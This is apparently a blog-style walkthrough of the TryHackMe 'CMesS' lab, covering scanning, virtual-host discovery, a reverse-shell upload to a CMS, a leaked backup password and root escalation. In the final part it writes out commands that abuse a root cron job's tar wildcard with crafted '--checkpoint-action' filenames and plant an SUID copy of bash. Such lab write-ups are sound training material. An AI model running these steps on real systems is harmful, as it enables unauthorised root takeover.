This was a medium level challenge on TryHackMe.

Started off with the traditional Nmap scan

```diff
nmap 10.10.102.218 -T4 -A -p- -sV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-19 05:49 EDT                                                                                                                                                                          
Nmap scan report for cmess.thm (10.10.102.218)                                                                                                                                                                                              
Host is up (0.32s latency).                                                                                                                                                                                                                 
Not shown: 65533 closed tcp ports (reset)                                                                                                                                                                                                   
PORT   STATE SERVICE VERSION                                                                                                                                                                                                                
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)                                                                                                                                                           
| ssh-hostkey:                                                                                                                                                                                                                              
|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)                                                                                                                                                                              
|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)                                                                                                                                                                             
|_  256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)                                                                                                                                                                           
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))                                                                                                                                                                                         
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).                                                                                                                                                                         
| http-robots.txt: 3 disallowed entries                                                                                                                                                                                                     
|_/src/ /themes/ /lib/
|_http-generator: Gila CMS
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=8/19%OT=22%CT=1%CU=44588%PV=Y%DS=5%DC=T%G=Y%TM=66C3
OS:1937%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%II=I%TS=8)SEQ(S
OS:P=106%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)SEQ(SP=106%GCD=2%ISR=10A%TI=Z%CI
OS:=I%II=I%TS=8)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST
OS:11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=
OS:68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T
OS:=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
OS:=Y%DFI=N%T=40%CD=S)

Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   248.89 ms 10.17.0.1
2   ... 4
5   389.48 ms cmess.thm (10.10.102.218)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1008.27 seconds

```

Nothing interesting here except for the open web port. I navigated to the website and looked around, found nothing except for a admin and login page asking for Email and password. Tried to reset the password, but no luck there either as it was again asking for Email ID.

Went ahead with directory busting, but again no luck there.
```diff
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://cmess.thm/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cmess.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500                                                                                                                                                                 
________________________________________________                                                                                                                                                                                            
                                                                                                                                                                                                                                            
                       [Status: 200, Size: 3865, Words: 522, Lines: 108, Duration: 370ms]
 directory-list-2.3-medium.txt [Status: 200, Size: 3865, Words: 522, Lines: 108, Duration: 615ms]
01                      [Status: 200, Size: 4078, Words: 431, Lines: 103, Duration: 551ms]
1                       [Status: 200, Size: 4078, Words: 431, Lines: 103, Duration: 948ms]
login                   [Status: 200, Size: 1580, Words: 377, Lines: 42, Duration: 338ms]
category                [Status: 200, Size: 3862, Words: 522, Lines: 110, Duration: 1195ms]
about                   [Status: 200, Size: 3353, Words: 372, Lines: 93, Duration: 8921ms]
 license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 3865, Words: 522, Lines: 108, Duration: 9091ms]
search                  [Status: 200, Size: 3851, Words: 522, Lines: 108, Duration: 9678ms]
 Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 3865, Words: 522, Lines: 108, Duration: 9746ms]
 Copyright 2007 James Fisher [Status: 200, Size: 3865, Words: 522, Lines: 108, Duration: 9749ms]
themes                  [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 315ms]
feed                    [Status: 200, Size: 735, Words: 37, Lines: 22, Duration: 1738ms]
index                   [Status: 200, Size: 3851, Words: 522, Lines: 108, Duration: 4607ms]
                       [Status: 200, Size: 3865, Words: 522, Lines: 108, Duration: 5410ms]
 Priority ordered case sensative list, where entries were found  [Status: 200, Size: 3865, Words: 522, Lines: 108, Duration: 5411ms]
                       [Status: 200, Size: 3865, Words: 522, Lines: 108, Duration: 5572ms]
0                       [Status: 200, Size: 3851, Words: 522, Lines: 108, Duration: 5521ms]
 Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 3865, Words: 522, Lines: 108, Duration: 5574ms]
 on atleast 2 different hosts [Status: 200, Size: 3865, Words: 522, Lines: 108, Duration: 5574ms]
                       [Status: 200, Size: 3865, Words: 522, Lines: 108, Duration: 6054ms]
                        [Status: 200, Size: 3865, Words: 522, Lines: 108, Duration: 6053ms]

```
At this point I was a bit stuck, However an error message in the my ffuf result said "on atleast 2 different hosts". This got me thinking if there was a Virtual host somewhere behind.

Now I used to FFUF once again for hunting the vhost.
```diff
└─# ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://cmess.thm/  -H "Host: FUZZ.cmess.thm" -fw 522                                                                                             

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cmess.thm/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.cmess.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 522
________________________________________________

dev                     [Status: 200, Size: 934, Words: 191, Lines: 31, Duration: 619ms]

```

Now we have to add dev.cmess.thm to /etc/host. Then, Navigating to the http://dev.cmess.thm gave us access to the development logs, where we can get the Mail ID and password. Now using this Mail ID and password we can login to http://cmess.thm/admin. Now we can upload a .phtml reverse shell to the CMS and open up a netcat listener in our host machine. 

This gives us shell to a low level user. The permissions of this user is very restricted to lets try to elevate to different user. I looked for standard privilege escalation signs but found none. With a little bit of help from linpeash.sh, I found /opt/.password.bak. After catting it I got

```diff

cat /opt/.password.bak
cat /opt/.password.bak
andres backup password
UQfsdCB7aAP6
```
Now I tried to ssh into the target as ander with the newly found password.

Now for further privilege escalation. I looked around for sudo access and SUID permission but no luck. Then I cat out the contents of /etc/crontab

```diff
cat /etc/crontab 
 # /etc/crontab: system-wide crontab
 # Unlike any other crontab you don't have to run the `crontab'
 # command to install the new version when you edit this file
 # and files in /etc/cron.d. These files also have username fields,
 # that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

 # m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *

```
We have a wildcard usage in a cronjob run by root. We can leverage this to gain root by doing the following.

```diff
echo "cp /bin/bash /tmp/bash; chmod +s  /tmp/bash" >> /home/andre/backup/runme.sh
chmod +x /home/andre/backup/runme.sh 
touch /home/andre/backup/--checkpoint=1
touch /home/andre/backup/--checkpoint-action=exec=sh\runme.sh

```

So, what we are doing is creating a script which copies /bin/bash to tmp/bash with SUID permissions. Making the script executable. Then we are creating a file named --checkpoint=1 in /home/andre/backup which is the directory mentioned in the cron job to run tar. --checkpoint=1 is a functionality in tar which set it as a checkpoint. The next file "--checkpoint-action=exec=sh\ runme.sh" tells tar to execute an action when that checkpoint is reached, the action being running the script to move bash.

Now wait for a while, once the cronjob is triggered our script will execute and we can find bash in /tmp. Once bash is copied to /tmp, we should run
```diff
$/tmp/bash -p
bash-4.3# whoami
root

``

And we have root!!
